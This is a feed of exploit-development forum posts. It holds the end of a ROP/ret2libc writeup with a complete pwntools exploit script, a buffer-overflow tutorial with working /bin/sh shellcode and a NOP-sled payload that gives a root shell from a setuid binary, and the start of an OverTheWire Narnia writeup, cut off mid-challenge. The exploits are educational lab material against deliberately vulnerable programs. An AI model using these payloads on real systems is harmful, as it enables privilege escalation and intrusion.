def overwrite_memory(addr, data):
    p.sendline('14')
    p.sendline('')
    p.sendline(str(addr))
    p.sendline(str(data))


def send_eof():
    """
    Note Send EOF sends 2 bytes!!!
    """
    p.sendline(chr(tty.CEOF))


setup()
"""
Overwrite the GOT of puts for the ability to write memory many times
"""
write_junk(14)
# 0x40088e = calc_sum
# 0x601018 = GOT of puts
# Overwrite GOT of puts with calc_sum
overwrite_memory(0x601018 - 17*8, 0x40088e)
send_eof()


"""
Overwrite the GOT of __stack_chk_fail for beating the stack cookie
"""
write_junk(13)
# 0x601020 = GOT of __stack_chk_fail
# 0x4009b3 = leaveq retq instruction in calc_sum, essentially beating the stack_chk_fail
overwrite_memory(0x601020 - 17*8, 0x4009b3)
send_eof()

"""
Overwrite global n to overwrite more data on the stack
"""
write_junk(13)
# n = 0x6010b0
# Overwrite n with 30
overwrite_memory(0x6010b0 - 17*8, 30)
send_eof()


"""
Overwrite the stack with ROP chain for ret2libc
"""
write_junk(17)
p.sendline('24')
# 0x400a83 : pop rdi ; ret
p.sendline(str(0x400a83))

# /bin/sh = 0x7ffff7990e9a
p.sendline(str(0x7ffff7990e9a))

# 0x00400646 = ret
# This is needed because the movaps instruction must be properly aligned.
p.sendline(str(0x00400646))

# system() = 0x7ffff782c440
p.sendline(str(0x7ffff782c440))
p.sendline("")
p.interactive()
</code></pre>
<p>Most of the script has already been discussed.<br>
Let us focus on the rest that remains.</p>
<pre data-code-wrap="py"><code class="lang-py">"""
Overwrite the stack with ROP chain for ret2libc
"""
write_junk(17)
p.sendline('24')
# 0x400a83 : pop rdi ; ret
p.sendline(str(0x400a83))

# /bin/sh = 0x7ffff7990e9a
p.sendline(str(0x7ffff7990e9a))

# 0x00400646 = ret
# This is needed because the movaps instruction must be properly aligned.
p.sendline(str(0x00400646))

# system() = 0x7ffff782c440
p.sendline(str(0x7ffff782c440))
p.sendline("")
p.interactive()
</code></pre>
<p><strong>The first question that needs to be answered: Why have some constants changed?</strong><br>
<code>write_junk(13)</code> was used while overwriting memory the last time why is <code>write_junk(17)</code> used this time?</p>
<p>This is due to the fact that <code>n = 21</code> in all previous cases but we have just recently overwritten <code>n = 30</code> so that we can overwrite more of the stack. Hence, the offsets at which the local variable <code>i</code> is overwritten has changed.<br>
You can experiment with the same method used above to figure out the offset when n = 30.</p>
<p>Okay, now let’s discuss the <strong>ROP</strong> part of the exploit.</p>
<pre data-code-wrap="py"><code class="lang-py"># 0x400a83 : pop rdi ; ret
p.sendline(str(0x400a83))

# /bin/sh = 0x7ffff7990e9a
p.sendline(str(0x7ffff7990e9a))

# 0x00400646 = ret
# This is needed because the movaps instruction must be properly aligned.
p.sendline(str(0x00400646))

# system() = 0x7ffff782c440
p.sendline(str(0x7ffff782c440))
</code></pre>
<p>To set up our exploit, we overwrite the stack to the point where we can overwrite the return address.<br>
We then place the address of the <code>pop rdi; ret</code> ROP gadget followed by the address to the <code>/bin/sh</code> string.</p>
<p>When the function returns, it jumps to execute <code>pop rdi; ret</code>. Since the address of the string is on the stack, <code>pop rdi</code> places the address of the string in the rdi register. And then we <code>ret</code> to another address…</p>
<p>… The address we jump to is the address of <code>ret</code> instruction. <code>ret</code> gadget is used to align our stack. (This is necessary since movaps instruction (used by system()) needs the stack to be 16 bit aligned.). <code>ret</code> is a NOP in ROP (a gadget that does nothing).</p>
<p><strong>Note that this might not be necessary if your stack is already 16 bit aligned.</strong></p>
<p>We then place the address of the system call on the stack. The <code>ret</code> gadget then pops this address off the stack and then jumps to system() in libc.</p>
<p>We have successfully placed the address of the string ‘/bin/sh’ in <code>rdi</code> and then jumped to system()!</p>
<p><strong>Wait… There is more…</strong><br>
Remember we overwrote the GOT entry of __stack_chk__fail so that the stack cookie check would unconditionally return to <code>leaveq; ret</code><br>
Since we have overwritten the return address, we have surely overwritten the stack cookie.<br>
Therefore, if we hadn’t overwritten the GOT entry of <code>__stack_chk_fail</code> our exploit would have failed.</p>
<p><strong>We can also overwrite a GOT entry and jump using that to avoid this</strong>.</p>
<h2><a name="p-54170-putting-it-all-together-16" class="anchor" href="https://d.clarkee.co.uk#p-54170-putting-it-all-together-16"></a>Putting it all together</h2>
<pre data-code-wrap="fish"><code class="lang-fish">[gnik@tinybot ~/]$ python3 exploit.py
[+] Starting local process './thebinary': pid 18969
[*] Switching to interactive mode
n = 21
....
....
SUM = -3105548685935727921
$ $ whoami
whoami
gnik
</code></pre>
<p><strong>This is my first post here in 0x00sec, so any feedback would be helpful. In an upcoming writeup, we will exploit the same executable but with ASLR enabled. : )</strong></p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751</link>
          <pubDate>Wed, 11 Mar 2020 04:42:11 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-19751</guid>
          <source url="https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751.rss">Punishing code with magic numbers with ROP and ret2libc on an x86_64</source>
        </item>
        <item>
          <title>Buffer Overflow to Run Root Shell</title>
          <dc:creator><![CDATA[Ph03n1x_Crus4d3r]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>Buffer Overflow Basics</h1>
<h3>Overview</h3>
<p>Buffer overflows were an earth-shattering vulnerability exploited in the late 1980’s that are protected against on modern systems. That said, they are still relevant, and pave the way to learning more advanced exploits.</p>
<p>This vulnerable program is implemented in C++.</p>
<h3>What is a buffer?</h3>
<p>Arrays allocate storage space in what is called a <em>buffer</em> .</p>
<p>Syntax: <code>type array[buffer_length];</code></p>
<p>Ex: <code>char input[50]; // An array of up to 50 characters.</code><br>
<code>Variable = input [49] // max</code><br>
<code>Variable = input [250] // accessing memory outside the array</code></p>
<h3>The Stack</h3>
<p>All variables are stored in RAM allocated per-program in a <strong>stack frame</strong> .</p>
<p>Ex:</p>
<pre><code class="lang-auto">fxn() {  
  array[50]  
  return // overwritten  
}  

main() {  
  var1  
  fxn()  
}  
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82.png" data-download-href="/uploads/short-url/u4ijrbdmIhaiaEC6PhLTEUnHqPE.png?dl=1" title="stack.png"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82_2_204x413.png" alt="stack.png" data-base62-sha1="u4ijrbdmIhaiaEC6PhLTEUnHqPE" width="204" height="413" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82_2_204x413.png, https://0x00sec.s3.amazonaws.com/optimized/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82_2_306x619.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82_2_408x826.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82_2_10x10.png"></a></div><p></p>
<h3>Registers</h3>
<p>EBP: Extended Base Pointer</p>
<ul>
<li>Points to base of the stack</li>
</ul>
<p>ESP: Extended Stack Pointer</p>
<ul>
<li>Points to the top of the stack</li>
</ul>
<p>EIP: Extended Instruction Pointer</p>
<ul>
<li>Return address</li>
</ul>
<h3>How do we Exploit This?</h3>
<p>We can feed any memory address within the stack into the EIP. The program will execute instructions at that memory address. We can put our own <em>shellcode</em> into the stack, put the address to the start of the shellcode at the EIP, and the program will execute the shellcode. Shellcode is a collection of operation codes (written in hex) whose goal is to open a root shell instance.</p>
<h3>The Actual Hack</h3>
<p>Instead of returning <em>exactly</em> where our shellcode starts, we can put no operation (NOP) hex instructions (0x90) into the stack.</p>
<ol>
<li>Write past array buffer ending.</li>
<li>Find where we want our address to return to (somewhere in the NOP region).</li>
<li>Overwrite return address at EIP with our address.</li>
<li>Don’t write past EIP!</li>
</ol>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/9/91b8cbdc3394c801290063600147221ae418a64f.png" data-download-href="/uploads/short-url/kN79Lwg4dS6UYi0Bd6KZIkUfGvt.png?dl=1" title="hacked_stack.png"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/9/91b8cbdc3394c801290063600147221ae418a64f_2_224x402.png" alt="hacked_stack.png" data-base62-sha1="kN79Lwg4dS6UYi0Bd6KZIkUfGvt" width="224" height="402" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/9/91b8cbdc3394c801290063600147221ae418a64f_2_224x402.png, https://0x00sec.s3.amazonaws.com/optimized/2X/9/91b8cbdc3394c801290063600147221ae418a64f_2_336x603.png 1.5x, /uploads/default/original/2X/9/91b8cbdc3394c801290063600147221ae418a64f.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/91b8cbdc3394c801290063600147221ae418a64f_2_10x10.png"></a></div><p></p>
<h1>Demo</h1>
<h3>Setup</h3>
<ol>
<li>Get on a Linux system if you want to follow along with this one.</li>
<li>First, you can download our <a href="https://www.danielmills.org/downloads/buffer_overflow/escalate.cpp" rel="noopener nofollow ugc">vulnerable program</a> and the <a href="https://www.danielmills.org/downloads/buffer_overflow/shellcode.txt" rel="noopener nofollow ugc">shellcode</a> we’ll be using.</li>
<li>Disable <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" rel="noopener nofollow ugc">ASLR</a> (must be root to do this):<br>
<code>echo "0" &gt; /proc/sys/kernel/randomize_va_space</code>
</li>
<li>Compile disabling buffer protections:<br>
<code>g++ escalate.cpp -o escalate -m32 -fno-stack-protector -z execstack</code>
</li>
<li>Give root permissions (must be root to do this - you can try <code>sudo -i</code> ):<br>
<code>chown root:root escalate</code> <code>chmod u+s escalate</code>
</li>
<li>Give this file to a user that doesn’t have root permissions. My non-root user is called hax for this demo. Type <code>ls -l</code> to double check that the permissions are aligned:</li>
</ol>
<p><img src="/uploads/default/original/2X/3/36c843ff2c1fadad1d6e8c4237d868deff8b6c5b.png" alt="1.PNG" data-base62-sha1="7OCQJjWyqacBaFQuYVdMeQtXOj1" width="509" height="24"></p>
<p>Now we can start trying to exploit the program! As reference, here is the source code:</p>
<pre><code class="lang-auto">#include &lt;iostream&gt;  
#include &lt;cstring&gt;  

void vulnerable(char *tmp) {  
    char input[400];  
    strcpy(input,tmp); //copies a malicious string into the character buffer  
}  

int main(int argc, char* argv[]) {  
    if (argc != 2) { //error message if run improperly  
        std::cout &lt;&lt; "Usage: ./prog argn";  
        return 1;  
    }  
    vulnerable(argv[1]); //passes our input to the vulnerable function  
    return 0;  
}  
</code></pre>
<h3>Hacking Time!</h3>
<p>To review, we know:</p>
<ol>
<li>The buffer is 400 characters long</li>
<li>The first command line argument we type in will be copied into that buffer.</li>
</ol>
<p>Here’s how I started poking around:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93.png" data-download-href="/uploads/short-url/engc4dvqqlzIDjA0BYgxen6BAzN.png?dl=1" title="2.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93_2_690x92.png" alt="2.PNG" data-base62-sha1="engc4dvqqlzIDjA0BYgxen6BAzN" width="690" height="92" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93_2_690x92.png, /uploads/default/original/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93.png 1.5x, /uploads/default/original/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93_2_10x10.png"></a></div><p></p>
<p>You can use python (or another scripting language, like perl) to run in the command line. I am telling python to print a 400 character long string of “AAAAAA…” into the terminal as an argument to our vulnerable program. The syntax for doing so is this:<br>
<code>python -c 'print "A"*400'</code><br>
The backticks make python evaluate whatever you input before running our program.</p>
<p>As you can see, we get a segmentation fault at 408 characters. If you remember back to my speil earlier, we don’t want to write past the EIP, so lets check the value of the EIP by loading this crash scenario into GDB with the following command:<br>
<code>gdb -q --args ./escalate </code>python -c ‘print “A”*408’`` . Then type <code>run</code> .</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5.png" data-download-href="/uploads/short-url/aW7orbW4YJuPLsw2vt4zmNi0F01.png?dl=1" title="3.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5_2_690x282.png" alt="3.PNG" data-base62-sha1="aW7orbW4YJuPLsw2vt4zmNi0F01" width="690" height="282" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5_2_690x282.png, /uploads/default/original/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5.png 1.5x, /uploads/default/original/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5_2_10x10.png"></a></div><p></p>
<p>The value “A” in hex is 41, so as you can see, the EIP has not been overwritten. One good thing to note is that gdb handily tells you the EIP’s value in blue without you needing to type the <code>info reg eip</code> command. For the rest of the tutorial, I expect you to look at the value in blue to track with me.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8.png" data-download-href="/uploads/short-url/jJyJBEloDxW4arrRIDK5vBRf556.png?dl=1" title="4.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8_2_690x264.png" alt="4.PNG" data-base62-sha1="jJyJBEloDxW4arrRIDK5vBRf556" width="690" height="264" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8_2_690x264.png, /uploads/default/original/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8.png 1.5x, /uploads/default/original/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8_2_10x10.png"></a></div><p></p>
<p>After a little trial and error, I found that 416 is the magic number to overwrite the EIP completely without going over. To illustrate this, I wrote 412 values of A into the buffer (41 in hex) and 4 values “BCDE” at the end (42, 43, 44, 45 in hex). As you can see, the EIP has the value <code>45444342</code> in it. It has reversed order because my pc stores data in a little endian way - as do most.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1.png" data-download-href="/uploads/short-url/yMjIIDOBMJC2PQNOxyF0O6Up2X7.png?dl=1" title="5.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1_2_690x265.png" alt="5.PNG" data-base62-sha1="yMjIIDOBMJC2PQNOxyF0O6Up2X7" width="690" height="265" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1_2_690x265.png, /uploads/default/original/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1.png 1.5x, /uploads/default/original/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1_2_10x10.png"></a></div><p></p>
<p>Now it’s time to look at the stack to find a good return address for our exploit. The gdb command <code>x/32z $esp</code> will display 32 DWORDs of the stack at a time.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34.png" data-download-href="/uploads/short-url/vBY3JHeRQkvNUaJFLwKTJhOgwio.png?dl=1" title="6.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34_2_690x317.png" alt="6.PNG" data-base62-sha1="vBY3JHeRQkvNUaJFLwKTJhOgwio" width="690" height="317" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34_2_690x317.png, /uploads/default/original/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34.png 1.5x, /uploads/default/original/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34_2_10x10.png"></a></div><p></p>
<p>Hit enter to keep scrolling at this rate. You should see a ton of 41s on the stack from our input. The address I highlighted is near the top end of the buffer. It will be a good address to return to in the middle of our NOP region (refer to the earlier picture to see how we will structure this exploit). If you are following along, your address will likely be different.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d.png" data-download-href="/uploads/short-url/v5dNBYikUBZg4QeAKeSl8XsXAmN.png?dl=1" title="7.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d_2_690x362.png" alt="7.PNG" data-base62-sha1="v5dNBYikUBZg4QeAKeSl8XsXAmN" width="690" height="362" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d_2_690x362.png, /uploads/default/original/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d.png 1.5x, /uploads/default/original/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d_2_10x10.png"></a></div><p></p>
<p>If we scroll a little farther down the stack, we see the value we overwrote the EIP with.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5.png" data-download-href="/uploads/short-url/egGOhh4AVZDwDK7tVHL795nupjn.png?dl=1" title="8.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5_2_690x374.png" alt="8.PNG" data-base62-sha1="egGOhh4AVZDwDK7tVHL795nupjn" width="690" height="374" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5_2_690x374.png, /uploads/default/original/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5.png 1.5x, /uploads/default/original/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5_2_10x10.png"></a></div><p></p>
<p>Now, let’s slow down a little bit and structure our attack. I don’t want to lose you in this somewhat confusing process!</p>
<ol>
<li>We know that the region of 41s on the stack is our entire buffer up to the EIP</li>
<li>The value BCDE is what the EIP will be overwritten with.</li>
<li>Our return address is 0xffffd480</li>
</ol>
<p>What we need to find is the length of our shellcode so we can split the remaining 412 character length of the buffer into NOP and the shellcode while keeping it the same length. I call an instance of python in the terminal (yes, I know 2.7 is outdated haha!) and find the length of our shellcode. It is 53 bytes long.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa.png" data-download-href="/uploads/short-url/6jWBpiFvKAnjIkk3dl8syYrent8.png?dl=1" title="9.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa_2_690x151.png" alt="9.PNG" data-base62-sha1="6jWBpiFvKAnjIkk3dl8syYrent8" width="690" height="151" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa_2_690x151.png, /uploads/default/original/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa.png 1.5x, /uploads/default/original/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa_2_10x10.png"></a></div><p></p>
<p>buffer: 412 bytes<br>
shellcode: 53<br>
NOP: 412 - 53 = 359 bytes<br>
return address: 4 bytes</p>
<p>The no operation (NOP) instruction is <code>0x90</code> for 64 bit Intel architecture processors.</p>
<p>So now our attack string looks like:<br>
<code>./escalate </code>python -c 'print “\x90”*359 +<br>
“\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh”</p>
<ul>
<li>“\x80\xd4\xff\xff”’``</li>
</ul>
<p>We use <code>\x</code> to denote to python that the following number is a hex number instead of printable characters.<br>
If we load this into gdb, we get the following result:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c.png" data-download-href="/uploads/short-url/w2tRde4VditdqowKZCAM0T1GC7O.png?dl=1" title="10.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c_2_690x330.png" alt="10.PNG" data-base62-sha1="w2tRde4VditdqowKZCAM0T1GC7O" width="690" height="330" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c_2_690x330.png, /uploads/default/original/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c.png 1.5x, /uploads/default/original/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c_2_10x10.png"></a></div><p></p>
<p>Gdb is not escalated to root permissions, so we get a user level shell (I am still the user hax). However, if we run this outside of gdb, we get a root shell instance:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/c/ce007957fde478deec2efce19ca246624ac2a76e.png" data-download-href="/uploads/short-url/tonndo1OejTBwuBs8e3xGjwxwyq.png?dl=1" title="11.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/ce007957fde478deec2efce19ca246624ac2a76e_2_690x230.png" alt="11.PNG" data-base62-sha1="tonndo1OejTBwuBs8e3xGjwxwyq" width="690" height="230" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/ce007957fde478deec2efce19ca246624ac2a76e_2_690x230.png, /uploads/default/original/2X/c/ce007957fde478deec2efce19ca246624ac2a76e.png 1.5x, /uploads/default/original/2X/c/ce007957fde478deec2efce19ca246624ac2a76e.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/ce007957fde478deec2efce19ca246624ac2a76e_2_10x10.png"></a></div><p></p>
<p>It worked! The root shell is denoted by the <code>#</code> and I show that I can now edit the passwd file. <code>whoami</code> returns <code>root</code> as the user.</p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/buffer-overflow-to-run-root-shell/18629">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/buffer-overflow-to-run-root-shell/18629</link>
          <pubDate>Thu, 16 Jan 2020 20:58:12 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-18629</guid>
          <source url="https://d.clarkee.co.uk/t/buffer-overflow-to-run-root-shell/18629.rss">Buffer Overflow to Run Root Shell</source>
        </item>
        <item>
          <title>OverTheWire Narnia challenges 0-4 Writeups (Binary exploitation basics with explanations)</title>
          <dc:creator><![CDATA[chivato]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>OverTheWire Narnia challenges 0-4 Writeups</h1>
<p>In this post I will be writing up challenges 0-4 from the Narnia series on OverTheWire, with the best explanation I can come up with for each, so someone that has no understanding of pwn, can get a base, and play the challenges for themselves.</p>
<p>Each pwnable consists of a SetUID binary (this means on runtime it will execute as another user, so if we can make the binary spawn a shell while it is running, the shell will be as another user), and the .c sourcecode, so we can get an idea of how each challenge is made up (in this writeup I have anotated the source codes to help clarify what is happening).</p>
<p>I found that being able to visualize how the stack is structured helped me massively to understand what is happening in this attack. Here is a perfect video from Computerphile (<a href="https://youtube.com/computerphile" rel="nofollow noopener">https://youtube.com/computerphile</a>) that elaborates upon what the attack consists of, and how it works <a href="https://www.youtube.com/watch?v=1S0aBV-Waeo" rel="nofollow noopener">https://www.youtube.com/watch?v=1S0aBV-Waeo</a>.</p>
<h1>Challenge 0</h1>
<p>Our first step is to login to the first user on SSH, using the credentials narnia0:narnia0, on port 2226.<br>
<code>ssh narnia0@narnia.labs.overthewire.org -p 2226</code><br>
Now we head to the /narnia/ directory and find the source code and binary, here is the source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(){
    long val=0x41414141;  /*Puts the value we want to overwrite on the stack*/
    char buf[20];         /*Sets the buffer length to 20 bytes*/

    printf("Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&amp;buf); /*Reads input into buffer (24 char limit on buffer, which is enough to fill the buffer and then the 4 bytes for deadbeef)*/

    printf("buf: %s\n",buf); /*Prints contents of buffer*/
    printf("val: 0x%08x\n",val); /*Outputs value we want to overwrite*/

    if(val==0xdeadbeef){ /*If value == 0xdeadbeef*/
        setreuid(geteuid(),geteuid()); /*Make the binary use the SUID and GUID*/
        system("/bin/sh"); /*Run /bin/sh to spawn a shell*/
    }
    else { /*If the value isn't 0xdeadbeef then*/
        printf("WAY OFF!!!!\n"); /*Print "WAY OFF!!!!" and then exit*/
        exit(1);
    }

    return 0;
}
</code></pre>
<p>So this challenge is extremely straight forward, essentially, we can right to the buffer, which is of size 20, and since there are no limits on how much we can input into the buffer, it allows us to write more than twenty characters to memory, and since the “val” variable is the next value on the stack, we can overwrite it’s contents.</p>
<p>We can do this two ways, the clean way, and the disgusting way:</p>
<p>The clean way would be make python print twenty A’s (the buffer size), plus the value we want to put in memory, which in this case needs to be in little endian format.</p>
<p>We know it needs to be little endian format since when we run “file /narnia/narnia0”, we get the following output:<br>
<code>narnia0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, not stripped</code> (<a href="https://en.wikipedia.org/wiki/Endianness" rel="nofollow noopener">https://en.wikipedia.org/wiki/Endianness</a>)</p>
<p>To convert a value to little endian (in this case we want to convert 0xdeadbeef), so we remove the 0x (this is just an indicator that the value is hex), then we split it up into groups of two (de ad be ef), now we reverse the order of the groups, but not the characters (ef be ad de), and finally we add “\x” in front of each group, and put them all together: <code>\xef\xbe\xad\xde</code>, so that’s what we need to feed the binary after the 20 bytes, let’s try it.</p>
<pre><code class="lang-auto">narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
                                               val: 0xdeadbeef
</code></pre>
<p>So the challenge bugs out, and doesn’t open a shell, but it does show us that the correct value is in place, now we can use a little trick involving cat to keep the i/o stream open:</p>
<pre><code class="lang-auto">narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0
Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
                                               val: 0xdeadbeef
whoami
narnia1
</code></pre>
<p>Voila! Challenge 0 has been pwned, now we have a shell as narnia1, and can simply cat the password for narnia1 from /etc/narnia_pass/narnia1.</p>
<h1>Challenge 1</h1>
<p>The next challenge makes things a bit more complicated, we are now given the following source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){ /*If the "EGG" env var is empty then*/
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1); /*And then exit*/
